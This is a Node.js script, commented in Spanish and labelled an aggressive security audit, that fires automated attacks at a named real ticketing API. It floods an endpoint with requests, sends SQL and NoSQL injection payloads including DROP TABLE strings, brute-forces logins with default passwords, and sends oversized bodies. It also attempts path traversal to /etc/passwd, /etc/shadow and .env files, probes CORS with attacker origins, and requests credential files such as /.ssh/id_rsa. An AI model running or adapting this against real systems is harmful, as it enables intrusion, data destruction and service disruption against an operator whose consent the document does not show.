/**
 * AGGRESSIVE SECURITY AUDIT - Jungala API
 * Tests más agresivos y exhaustivos
 */

const BASE_URL = 'https://ticketing-services.jungala.com';

// ========================================
// TEST 1: Rate Limiting Extremo (200 requests)
// ========================================
async function test1_AggressiveRateLimiting() {
  console.log('[TEST 1] Rate Limiting Agresivo - 200 requests');
  
  const results = [];
  const startTime = Date.now();
  
  for (let i = 0; i < 200; i++) {
    const start = Date.now();
    try {
      const response = await fetch(`${BASE_URL}/ws/v1/jungala/performance/get-calendar`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ date: '2025-12-31' })
      });
      
      results.push({
        status: response.status,
        blocked: response.status === 429 || response.status === 403,
        time: Date.now() - start
      });
    } catch (error) {
      results.push({ error: true });
    }
  }
  
  const endTime = Date.now();
  const blocked = results.filter(r => r.blocked).length;
  const avgTime = results.filter(r => r.time).reduce((a, b) => a + b.time, 0) / results.length;
  
  console.log(`Total: ${results.length} | Bloqueadas: ${blocked} | Tiempo: ${endTime - startTime}ms | Avg: ${avgTime.toFixed(2)}ms`);
  return { total: results.length, blocked, time: endTime - startTime };
}

// ========================================
// TEST 2: SQL Injection Agresivo
// ========================================
async function test2_AggressiveSQLInjection() {
  console.log('[TEST 2] SQL Injection Agresivo - 20 payloads');
  
  const payloads = [
    "' OR '1'='1",
    "1' OR '1' = '1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "admin'--",
    "' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
    "'; DROP TABLE users--",
    "'; DROP TABLE tickets--",
    "1; DROP TABLE events--",
    "{ $ne: null }",
    "{ $gt: '' }",
    "{ $where: '1==1' }",
    "'; WAITFOR DELAY '00:00:05'--",
    "1' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "admin' OR '1'='1' /*",
    "' OR '1'='1' ({",
    "' || '1'='1"
  ];
  
  let vulnerable = 0;
  
  for (const payload of payloads) {
    try {
      const response = await fetch(`${BASE_URL}/ws/v1/jungala/products/get-tickets`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ date: payload, ticketId: payload })
      });
      
      if (response.status === 200) {
        vulnerable++;
        console.log(`  ⚠️ VULNERABLE: ${payload.substring(0, 30)}`);
      }
    } catch (error) {
      // Error de red, payload rechazado
    }
  }
  
  console.log(`Payloads: ${payloads.length} | Vulnerables: ${vulnerable}`);
  return { total: payloads.length, vulnerable };
}

// ========================================
// TEST 3: Autenticación con Credenciales Comunes
// ========================================
async function test3_BruteForceAuth() {
  console.log('[TEST 3] Fuerza Bruta Autenticación - 30 intentos');
  
  const credentials = [
    { user: 'admin', pass: 'admin' },
    { user: 'admin', pass: 'password' },
    { user: 'admin', pass: '123456' },
    { user: 'root', pass: 'root' },
    { user: 'admin', pass: 'admin123' },
    { user: 'administrator', pass: 'administrator' },
    { user: 'admin', pass: 'password123' },
    { user: 'admin', pass: 'admin@123' },
    { user: 'user', pass: 'user' },
    { user: 'test', pass: 'test' },
    { user: 'guest', pass: 'guest' },
    { user: 'admin', pass: '' },
    { user: '', pass: 'admin' },
    { user: 'admin', pass: 'jungala' },
    { user: 'admin', pass: 'jungala123' },
    { user: 'jungala', pass: 'jungala' },
    { user: 'api', pass: 'api' },
    { user: 'admin', pass: '12345678' },
    { user: 'admin', pass: 'qwerty' },
    { user: 'admin', pass: 'letmein' },
    { user: 'superuser', pass: 'superuser' },
    { user: 'admin', pass: 'welcome' },
    { user: 'admin', pass: 'monkey' },
    { user: 'admin', pass: '1qaz2wsx' },
    { user: 'admin', pass: 'abc123' },
    { user: 'admin', pass: '111111' },
    { user: 'admin', pass: 'password1' },
    { user: 'admin', pass: '123123' },
    { user: 'admin', pass: 'admin2024' },
    { user: 'admin', pass: 'admin2025' }
  ];
  
  let success = 0;
  
  for (const cred of credentials) {
    try {
      const response = await fetch(`${BASE_URL}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(cred)
      });
      
      if (response.status === 200) {
        success++;
        console.log(`  ✅ ÉXITO: ${cred.user}:${cred.pass}`);
      }
    } catch (error) {
      // Endpoint no existe o rechaza
    }
  }
  
  console.log(`Intentos: ${credentials.length} | Exitosos: ${success}`);
  return { total: credentials.length, success };
}

// ========================================
// TEST 4: Buffer Overflow / Payloads Grandes
// ========================================
async function test4_BufferOverflow() {
  console.log('[TEST 4] Buffer Overflow - Payloads grandes');
  
  const sizes = [10000, 100000, 1000000, 5000000]; // 10KB, 100KB, 1MB, 5MB
  let crashed = 0;
  
  for (const size of sizes) {
    try {
      const payload = 'A'.repeat(size);
      const response = await fetch(`${BASE_URL}/ws/v1/jungala/products/get-tickets`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ data: payload })
      });
      
      if (response.status === 500 || response.status === 502) {
        crashed++;
        console.log(`  💥 CRASH con ${size} bytes`);
      }
    } catch (error) {
      crashed++;
      console.log(`  💥 ERROR con ${size} bytes: ${error.message}`);
    }
  }
  
  console.log(`Tamaños probados: ${sizes.length} | Crashes: ${crashed}`);
  return { total: sizes.length, crashed };
}

// ========================================
// TEST 5: Path Traversal Agresivo
// ========================================
async function test5_PathTraversal() {
  console.log('[TEST 5] Path Traversal - 25 payloads');
  
  const paths = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    '..%2f..%2f..%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '/etc/passwd',
    'C:\\Windows\\System32\\config\\sam',
    '../../../../../../etc/passwd',
    '..\\..\\..\\..\\..\\..\\..\\etc\\passwd',
    '/var/www/html/.env',
    '../.env',
    '../../.env',
    '../../../.env',
    '/proc/self/environ',
    '/proc/version',
    '../../../var/log/apache/access.log',
    'file:///etc/passwd',
    '....////....////etc/passwd',
    '/etc/shadow',
    '../../../database.sql',
    '/backup/database.sql',
    '../config/database.yml',
    '/var/www/.git/config',
    '../.git/config',
    '../../package.json'
  ];
  
  let vulnerable = 0;
  
  for (const path of paths) {
    try {
      const response = await fetch(`${BASE_URL}${path}`, {
        method: 'GET'
      });
      
      if (response.status === 200) {
        const text = await response.text();
        if (text.includes('root:') || text.includes('Administrator') || text.includes('<?php') || text.includes('password')) {
          vulnerable++;
          console.log(`  🚨 VULNERABLE: ${path}`);
        }
      }
    } catch (error) {
      // Path no accesible
    }
  }
  
  console.log(`Paths probados: ${paths.length} | Vulnerables: ${vulnerable}`);
  return { total: paths.length, vulnerable };
}

// ========================================
// TEST 6: CORS desde Múltiples Orígenes
// ========================================
async function test6_CORSMultipleOrigins() {
  console.log('[TEST 6] CORS - 15 orígenes maliciosos');
  
  const origins = [
    'https://evil.com',
    'https://tickets-jungala.com',
    'https://ticketsjungala.com',
    'https://jungala-tickets.com',
    'https://tickets.jungaIa.com',
    'http://localhost',
    'null',
    'https://attacker.com',
    'https://phishing-site.com',
    'https://tickets-jungala.mx',
    'https://jungala.evil.com',
    'https://www.tickets-jungala.com',
    'https://api.jungala.com',
    'https://jungala.com.attacker.com',
    'https://xn--jungala-k2a.com' // IDN homograph
  ];
  
  let allowed = 0;
  
  for (const origin of origins) {
    try {
      const response = await fetch(`${BASE_URL}/ws/v1/jungala/performance/get-calendar`, {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Origin': origin
        },
        body: JSON.stringify({ date: '2025-12-31' })
      });
      
      const corsHeader = response.headers.get('access-control-allow-origin');
      if (corsHeader === '*' || corsHeader === origin) {
        allowed++;
        console.log(`  ✅ PERMITIDO: ${origin}`);
      }
    } catch (error) {
      // Error de red
    }
  }
  
  console.log(`Orígenes probados: ${origins.length} | Permitidos: ${allowed}`);
  return { total: origins.length, allowed };
}

// ========================================
// TEST 7: Endpoints Sensibles Extendido
// ========================================
async function test7_SensitiveEndpoints() {
  console.log('[TEST 7] Endpoints Sensibles - 40 paths');
  
  const endpoints = [
    '/.env', '/.env.local', '/.env.production', '/.env.backup',
    '/config.json', '/config.yml', '/config.php', '/configuration.php',
    '/admin', '/admin/', '/admin/login', '/admin/dashboard',
    '/api/users', '/api/admin', '/api/config', '/api/keys',
    '/backup', '/backups', '/backup.sql', '/database.sql',
    '/.git/config', '/.git/HEAD', '/.svn/entries',
    '/swagger', '/swagger.json', '/swagger-ui', '/api-docs',
    '/graphql', '/graphiql', '/apollo',
    '/debug', '/debug/vars', '/_debug_toolbar',
    '/phpinfo.php', '/info.php', '/test.php',
    '/server-status', '/server-info',
    '/wp-admin', '/wp-login.php',
    '/.aws/credentials', '/.ssh/id_rsa'
  ];
  
  let accessible = 0;
  
  for (const endpoint of endpoints) {
    try {
      const response = await fetch(`${BASE_URL}${endpoint}`, {
        method: 'GET'
      });
      
      if (response.status === 200) {
        accessible++;
        console.log(`  🔓 ACCESIBLE: ${endpoint}`);
      }
    } catch (error) {
      // No accesible
    }
  }
  
  console.log(`Endpoints probados: ${endpoints.length} | Accesibles: ${accessible}`);
  return { total: endpoints.length, accessible };
}

// ========================================
// EJECUTAR TODOS LOS TESTS
// ========================================
async function runAggressiveAudit() {
  console.log('\n=== AUDITORÍA AGRESIVA DE SEGURIDAD - JUNGALA ===\n');
  
  const results = {};
  
  try {
    results.rateLimiting = await test1_AggressiveRateLimiting();
    await sleep(2000);
    
    results.sqlInjection = await test2_AggressiveSQLInjection();
    await sleep(2000);
    
    results.bruteForce = await test3_BruteForceAuth();
    await sleep(2000);
    
    results.bufferOverflow = await test4_BufferOverflow();
    await sleep(2000);
    
    results.pathTraversal = await test5_PathTraversal();
    await sleep(2000);
    
    results.cors = await test6_CORSMultipleOrigins();
    await sleep(2000);
    
    results.sensitiveEndpoints = await test7_SensitiveEndpoints();
    
  } catch (error) {
    console.error('Error en auditoría:', error);
  }
  
  console.log('\n=== RESUMEN ===');
  console.log(JSON.stringify(results, null, 2));
  
  return results;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Ejecutar
runAggressiveAudit().catch(console.error);
